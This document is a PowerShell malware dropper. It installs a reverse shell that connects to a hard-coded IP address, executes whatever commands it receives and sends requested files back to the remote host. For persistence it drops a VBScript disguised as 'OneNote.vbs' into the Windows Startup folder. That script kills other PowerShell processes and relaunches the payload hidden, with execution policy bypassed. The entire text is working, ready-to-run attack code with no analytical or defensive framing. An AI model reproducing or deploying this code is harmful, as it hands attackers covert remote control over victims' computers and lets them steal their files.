$code = @'
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient('34.140.143.225', 78)
        if ($client.Connected) {
            $stream = $client.GetStream()
            $lastResponseTime = [DateTime]::Now

            while ($client.Connected) {
                [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }  
                $i = $stream.Read($bytes, 0, $bytes.Length)   

                if ($i -gt 0) {
                    $lastResponseTime = [DateTime]::Now  
                    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)  

                    # Check if it's a file download request
                    if ($data -match "^download\s+(.+)") {
                        $filePath = $matches[1]
                        if (Test-Path $filePath -PathType Leaf) {
                            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                            $stream.Write($fileBytes, 0, $fileBytes.Length)
                            $stream.Flush()
                        } else {
                            $stream.Write([System.Text.Encoding]::ASCII.GetBytes("File not found."), 0, 14)
                            $stream.Flush()
                        }
                    } else {
                        $sendback = Invoke-Expression ". { $data } 2>&1" | Out-String    
                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '      
                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)   
                        $stream.Write($sendbyte, 0, $sendbyte.Length)                    
                        $stream.Flush()                                                  
                    }
                }

                $elapsedTime = [DateTime]::Now - $lastResponseTime
                if ($elapsedTime.TotalMinutes -ge 2) {
                    $client.Close()
                    break  
                }
            }

            $client.Close()  
        }
    } catch {
        Start-Sleep -Seconds 5  
    }
}

'@


$programsFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs')


$scriptPath = [System.IO.Path]::Combine($programsFolder, 'script.ps1')
$code | Out-File -FilePath $scriptPath -Encoding ascii


$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')


$batchScriptPath = [System.IO.Path]::Combine($startupFolder, 'OneNote.vbs')
$batchCode = @"
Function IsProcessRunning(processName)
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    IsProcessRunning = False
    For Each objProcess in colProcesses
        IsProcessRunning = True
    Next
End Function

' Function to terminate a process
Sub TerminateProcess(processName)
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    For Each objProcess in colProcesses
        objProcess.Terminate()
    Next
End Sub

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Path to the PowerShell script
scriptPath = "$scriptPath"

Do
    ' Check if PowerShell process is running and terminate it if necessary
    If IsProcessRunning("powershell.exe") Then
        TerminateProcess("powershell.exe")
    End If

    ' Command to run PowerShell script in hidden mode
    command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"

    ' Execute the command and capture return value
    returnValue = objShell.Run(command, 0, True)

    ' Wait for a moment before checking if the process is still running
    WScript.Sleep 5000

Loop
"@
$batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii

# Specify the path to the VBScript file

# Start the VBScript using cscript.exe
Start-Process $batchScriptPath

